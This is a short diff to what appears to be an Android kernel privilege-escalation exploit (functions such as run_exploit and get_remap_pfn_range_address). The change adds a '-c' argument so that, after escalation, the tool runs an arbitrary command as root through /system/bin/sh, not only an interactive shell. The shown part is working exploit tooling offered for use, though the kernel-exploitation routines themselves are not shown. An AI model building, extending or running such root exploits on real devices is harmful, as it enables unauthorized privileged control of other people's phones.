@@ -114,6 +114,16 @@ run_exploit(void)
 int
 main(int argc, char **argv)
 {
+  char* command = NULL;
+  int i;
+  for (i = 1; i < argc; i++) {
+    if (!strcmp(argv[i], "-c")) {
+      if (++i < argc) {
+        command = argv[i];
+      }
+    }
+  }
+
   set_kernel_phys_offset(0x200000);
   remap_pfn_range = get_remap_pfn_range_address();
   if (!remap_pfn_range) {
@@ -133,7 +143,11 @@ main(int argc, char **argv)
     exit(EXIT_FAILURE);
   }
 
-  system("/system/bin/sh");
+  if (command == NULL) {
+    system("/system/bin/sh");
+  } else {
+    execl("/system/bin/sh", "/system/bin/sh", "-c", command, NULL);
+  }
 
   exit(EXIT_SUCCESS);
 }
